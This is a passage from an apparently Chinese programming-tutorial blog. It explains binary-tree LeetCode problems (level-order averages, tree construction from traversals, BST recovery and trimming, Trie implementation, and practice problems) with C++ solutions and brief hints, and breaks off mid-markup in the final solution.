class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">TreeNode *<span class="title">dfs</span><span class="params">(TreeNode *node, <span class="type">const</span> unordered_set&lt;<span class="type">int</span>&gt; &amp;to_delete, vector&lt;TreeNode *&gt; &amp;res)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        node-&gt;left = <span class="built_in">dfs</span>(node-&gt;left, to_delete, res);</span><br><span class="line">        node-&gt;right = <span class="built_in">dfs</span>(node-&gt;right, to_delete, res);</span><br><span class="line">        <span class="keyword">if</span> (to_delete.<span class="built_in">count</span>(node-&gt;val)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;left)</span><br><span class="line">                res.<span class="built_in">push_back</span>(node-&gt;left);</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;right)</span><br><span class="line">                res.<span class="built_in">push_back</span>(node-&gt;right);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;TreeNode *&gt; <span class="title">delNodes</span><span class="params">(TreeNode *root, vector&lt;<span class="type">int</span>&gt; &amp;to_delete)</span> </span>&#123;</span><br><span class="line">        <span class="function">unordered_set&lt;<span class="type">int</span>&gt; <span class="title">delete_set</span><span class="params">(to_delete.begin(), to_delete.end())</span></span>;</span><br><span class="line">        vector&lt;TreeNode *&gt; res;</span><br><span class="line">        TreeNode *newRoot = <span class="built_in">dfs</span>(root, delete_set, res);</span><br><span class="line">        <span class="keyword">if</span> (newRoot) res.<span class="built_in">push_back</span>(newRoot); </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：这道题的重点是通过递归去寻找出正确的左节点或者是右节点。</p></li></ul><h2 id="二、层次遍历"><a href="#二、层次遍历" class="headerlink" title="二、层次遍历"></a>二、层次遍历</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/average-of-levels-in-binary-tree">二叉树的层平均值</a><br>给定一个二叉树，求每一层的节点值的平均数。<br><img src="https://assets.leetcode.com/uploads/2021/03/09/avg1-tree.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">double</span>&gt; <span class="title">averageOfLevels</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">double</span>&gt; res;</span><br><span class="line">        queue&lt;TreeNode *&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">double</span> sum = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> size = q.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">while</span> (size--) &#123;</span><br><span class="line">                TreeNode *node = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                sum += node-&gt;val;</span><br><span class="line">                ++count;</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left != <span class="literal">nullptr</span>)</span><br><span class="line">                    q.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right != <span class="literal">nullptr</span>)</span><br><span class="line">                    q.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(sum / count);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：很简单的广度优先搜索。</p></li></ul><h2 id="三、前中后序遍历"><a href="#三、前中后序遍历" class="headerlink" title="三、前中后序遍历"></a>三、前中后序遍历</h2><ul><li><p>算法解释：前序遍历、中序遍历和后序遍历是三种利用深度优先搜索遍历二叉树的方式。它们是在对节点访问的顺序有一点不同，其它完全相同。考虑如下一棵树：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> / \   \</span><br><span class="line">4   5   6</span><br></pre></td></tr></table></figure><ul><li>前序遍历为：1-&gt;2-&gt;4-&gt;5-&gt;3-&gt;6</li><li>中序遍历为：4-&gt;2-&gt;5-&gt;1-&gt;3-&gt;6</li><li>后序遍历为：4-&gt;5-&gt;2-&gt;6-&gt;3-&gt;1</li></ul></li><li><p>题目一：<a href="https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-inorder-traversal">从前序与中序遍历序列构造二叉树</a><br>给定一个二叉树的前序遍历和中序遍历结果，尝试复原这个树。已知树里不存在重复值的节点。<br><img src="https://assets.leetcode.com/uploads/2021/02/19/tree.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">TreeNode *<span class="title">createTree</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt; &amp;preorder, <span class="type">const</span> unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;inMap, <span class="type">int</span> inLeft, <span class="type">int</span> inRight, <span class="type">int</span> &amp;preIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (inLeft &gt; inRight) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="type">int</span> rootVal = preorder[preIndex++];</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootVal);</span><br><span class="line">        <span class="type">int</span> mid = inMap.<span class="built_in">at</span>(rootVal);</span><br><span class="line">        root-&gt;left = <span class="built_in">createTree</span>(preorder, inMap, inLeft, mid - <span class="number">1</span>, preIndex);</span><br><span class="line">        root-&gt;right = <span class="built_in">createTree</span>(preorder, inMap, mid + <span class="number">1</span>, inRight, preIndex);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; preorder, vector&lt;<span class="type">int</span>&gt;&amp; inorder)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; inorderMap;</span><br><span class="line">        <span class="type">int</span> size = preorder.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">            inorderMap[inorder[i]] = i;</span><br><span class="line">        <span class="type">int</span> preIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">createTree</span>(preorder, inorderMap, <span class="number">0</span>, size - <span class="number">1</span>, preIndex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：非常经典的构造树的方法，主要是要去递归地划分左子树和右子树，而这个必须要依靠中序遍历来完成，这也就是为什么没有中序遍历无法确定一棵树的原因。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/binary-tree-preorder-traversal">二叉树的前序遍历</a><br>实现二叉树的前序遍历。<br><img src="https://assets.leetcode.com/uploads/2024/08/29/screenshot-2024-08-29-202743.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">preorder</span><span class="params">(TreeNode* root, vector&lt;<span class="type">int</span>&gt;&amp; res)</span> </span>&#123;</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left != <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="built_in">preorder</span>(root-&gt;left, res);</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right != <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="built_in">preorder</span>(root-&gt;right, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">preorder</span>(root, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：不是用递归的话需要使用栈来实现，本质上其实是一样的。</p></li></ul><h2 id="四、二叉搜索树"><a href="#四、二叉搜索树" class="headerlink" title="四、二叉搜索树"></a>四、二叉搜索树</h2><ul><li><p>算法解释：二叉查找树(Binary Search Tree, BST)是一种特殊的二叉树：对于每个父节点，其左子树中所有节点的值小于等于父结点的值，其右子树中所有节点的值大于等于父结点的值。因此对于一个二叉查找树，我们可以在O(log n)的时间内查找一个值是否存在：从根节点开始，若当前节点的值大于查找值则向左下走，若当前节点的值小于查找值则向右下走。同时因为二叉查找树是有序的，对其中序遍历的结果即为排好序的数组。</p></li><li><p>例如下图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    4</span><br><span class="line">   / \</span><br><span class="line">  2   5</span><br><span class="line"> / \   \</span><br><span class="line">1   3   6</span><br></pre></td></tr></table></figure><p>其中序遍历结果为：1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6。</p></li><li><p>题目一：<a href="https://leetcode.cn/problems/recover-binary-search-tree">恢复二叉搜索树</a><br>给定一个二叉查找树，已知有两个节点被不小心交换了，试复原此树。<br><img src="https://assets.leetcode.com/uploads/2020/10/28/recover2.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">findMistakes</span><span class="params">(TreeNode* root, TreeNode* &amp;mistake1, TreeNode* &amp;mistake2, TreeNode* &amp;prev)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">findMistakes</span>(root-&gt;left, mistake1, mistake2, prev);</span><br><span class="line">        <span class="keyword">if</span> (prev != <span class="literal">nullptr</span> &amp;&amp; prev-&gt;val &gt; root-&gt;val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mistake1 == <span class="literal">nullptr</span>) mistake1 = prev;</span><br><span class="line">            mistake2 = root;</span><br><span class="line">        &#125;</span><br><span class="line">        prev = root;</span><br><span class="line">        <span class="built_in">findMistakes</span>(root-&gt;right, mistake1, mistake2, prev);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">recoverTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        TreeNode *mistake1 = <span class="literal">nullptr</span>, *mistake2 = <span class="literal">nullptr</span>;</span><br><span class="line">        TreeNode *prev = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="built_in">findMistakes</span>(root, mistake1, mistake2, prev);</span><br><span class="line">        <span class="built_in">swap</span>(mistake1-&gt;val, mistake2-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意使用中序遍历来对节点进行比较，因为中序遍历前节点一定小于后节点。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/trim-a-binary-search-tree">修剪二叉搜索树</a><br>给定一个二叉查找树和两个整数L和R，且L&lt;R，试修剪此二叉查找树，使得修剪后所有节点的值都在[L, R]的范围内。<br><img src="https://assets.leetcode.com/uploads/2020/09/09/trim2.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">trimBST</span><span class="params">(TreeNode* root, <span class="type">int</span> low, <span class="type">int</span> high)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &lt; low) </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">trimBST</span>(root-&gt;right, low, high);</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &gt; high) </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">trimBST</span>(root-&gt;left, low, high);</span><br><span class="line">        root-&gt;left = <span class="built_in">trimBST</span>(root-&gt;left, low, high);</span><br><span class="line">        root-&gt;right = <span class="built_in">trimBST</span>(root-&gt;right, low, high);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：没啥好说的，学会利用搜索树的性质：大于就返回左边更小的子树，小于就返回右边更大的子树。</p></li></ul><h2 id="五、字典树"><a href="#五、字典树" class="headerlink" title="五、字典树"></a>五、字典树</h2><ul><li><p>算法解释：字典树(Trie)用于判断字符串是否存在或者是否具有某种字符串前缀。假如我们有一个储存了近万个单词的字典，即使我们使用哈希，在其中搜索一个单词的实际开销也是非常大的，且无法轻易支持搜索单词前缀。然而由于一个英文单词的长度n通常在10以内，如果我们使用字典树，则可以在O(n)——近似 O(1)的时间内完成搜索，且额外开销非常小。</p></li><li><p>题目：<a href="https://leetcode.cn/problems/implement-trie-prefix-tree">实现 Trie (前缀树)</a><br>尝试建立一个字典树，支持快速插入单词、查找单词、查找单词前缀的功能。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TrieTree</span> &#123;</span><br><span class="line">    <span class="type">bool</span> is_end;</span><br><span class="line">    vector&lt;TrieTree*&gt; children;</span><br><span class="line">    <span class="built_in">TrieTree</span>() : <span class="built_in">is_end</span>(<span class="literal">false</span>), <span class="built_in">children</span>(<span class="number">26</span>, <span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Trie</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Trie</span>() &#123;</span><br><span class="line">        root = <span class="keyword">new</span> <span class="built_in">TrieTree</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    ~<span class="built_in">Trie</span>() &#123;</span><br><span class="line">        <span class="built_in">deleteNode</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(string word)</span> </span>&#123;</span><br><span class="line">        TrieTree* node = root;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : word) &#123;</span><br><span class="line">            <span class="type">int</span> idx = c - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;children[idx] == <span class="literal">nullptr</span>) </span><br><span class="line">                node-&gt;children[idx] = <span class="keyword">new</span> <span class="built_in">TrieTree</span>();</span><br><span class="line">            node = node-&gt;children[idx];</span><br><span class="line">        &#125;</span><br><span class="line">        node-&gt;is_end = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">search</span><span class="params">(string word)</span> </span>&#123;</span><br><span class="line">        TrieTree *node = root;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : word) &#123;</span><br><span class="line">            <span class="keyword">if</span> (node == <span class="literal">nullptr</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="type">int</span> idx = c - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            node = node-&gt;children[idx];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node != <span class="literal">nullptr</span> &amp;&amp; node-&gt;is_end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">startsWith</span><span class="params">(string prefix)</span> </span>&#123;</span><br><span class="line">        TrieTree *node = root;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : prefix) &#123;</span><br><span class="line">            <span class="keyword">if</span> (node == <span class="literal">nullptr</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="type">int</span> idx = c - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            node = node-&gt;children[idx];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node != <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    TrieTree* root;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">deleteNode</span><span class="params">(TrieTree* node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">for</span> (TrieTree* child : node-&gt;children) &#123;</span><br><span class="line">            <span class="built_in">deleteNode</span>(child);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">delete</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：实现起来并不是很困难，用一个bool变量更便捷的判断是否为一个单词的末尾，注意一下边界条件。</p></li></ul><h2 id="六、练习"><a href="#六、练习" class="headerlink" title="六、练习"></a>六、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/invert-binary-tree">翻转二叉树</a><br>给你一棵二叉树的根节点root，翻转这棵二叉树，并返回其根节点。<br><img src="https://assets.leetcode.com/uploads/2021/03/14/invert1-tree.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">invert</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        TreeNode *temp = root-&gt;left;</span><br><span class="line">        root-&gt;left = root-&gt;right;</span><br><span class="line">        root-&gt;right = temp;</span><br><span class="line">        <span class="built_in">invert</span>(root-&gt;left);</span><br><span class="line">        <span class="built_in">invert</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">invert</span>(root);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：还是比较简单的，递归的处理一下就行了。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/merge-two-binary-trees">合并二叉树</a><br>给你两棵二叉树：root1和root2。合并的规则是：如果两个节点重叠，那么将这两个节点的值相加作为合并后节点的新值；否则，不为null的节点将直接作为新二叉树的节点。返回合并后的二叉树。<br><img src="https://assets.leetcode.com/uploads/2021/02/05/merge.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">mergeTrees</span><span class="params">(TreeNode* root1, TreeNode* root2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="literal">nullptr</span> &amp;&amp; root2 == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="literal">nullptr</span> &amp;&amp; root2 != <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> root2;</span><br><span class="line">        <span class="keyword">if</span> (root1 != <span class="literal">nullptr</span> &amp;&amp; root2 == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> root1;</span><br><span class="line">        root1-&gt;left = <span class="built_in">mergeTrees</span>(root1-&gt;left, root2-&gt;left);</span><br><span class="line">        root1-&gt;right = <span class="built_in">mergeTrees</span>(root1-&gt;right, root2-&gt;right);</span><br><span class="line">        root1-&gt;val += root2-&gt;val;</span><br><span class="line">        <span class="keyword">return</span> root1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：不难，处理完为nullptr的情况后剩余的节点直接相加即可。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/subtree-of-another-tree">另一棵树的子树</a><br>给你两棵二叉树root和subRoot。检验root中是否包含和subRoot具有相同结构和节点值的子树。如果存在，返回true；否则，返回false。<br><img src="https://pic.leetcode.cn/1724998676-cATjhe-image.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSametree</span><span class="params">(TreeNode* root1, TreeNode* root2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="literal">nullptr</span> &amp;&amp; root2 == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (root1 == <span class="literal">nullptr</span> || root2 == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (root1-&gt;val != root2-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">isSametree</span>(root1-&gt;left, root2-&gt;left) &amp;&amp; <span class="built_in">isSametree</span>(root1-&gt;right, root2-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSubtree</span><span class="params">(TreeNode* root, TreeNode* subRoot)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">isSametree</span>(root, subRoot) || <span class="built_in">isSubtree</span>(root-&gt;left, subRoot) || <span class="built_in">isSubtree</span>(root-&gt;right, subRoot);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：subTree肯定需要遍历一遍root的节点，所以对每个根节点进行是否是同样的树的判断即可。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/sum-of-left-leaves">左叶子之和</a><br>给定二叉树的根节点 root ，返回所有左叶子之和。<br><img src="https://assets.leetcode.com/uploads/2021/04/08/leftsum-tree.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span 